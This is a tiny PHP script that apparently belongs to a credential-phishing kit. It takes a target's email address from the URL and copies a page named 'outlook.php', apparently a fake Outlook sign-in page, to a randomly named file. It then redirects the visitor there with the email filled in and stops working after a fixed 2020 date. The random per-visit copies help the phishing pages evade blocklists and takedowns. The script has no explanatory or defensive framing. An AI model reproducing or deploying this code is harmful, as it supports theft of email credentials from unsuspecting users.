<?php
	$current_timestamp = time();$md5 = md5(time());$email = $_GET['e'];$file = 'outlook.php';$newfile = 'files/'.$md5.'.php';if (time() <= 1588291200){if (!copy($file, $newfile)) {echo "Failed contact developer";}else{header("Location: ".$newfile."?e=".$email);die();}}
?>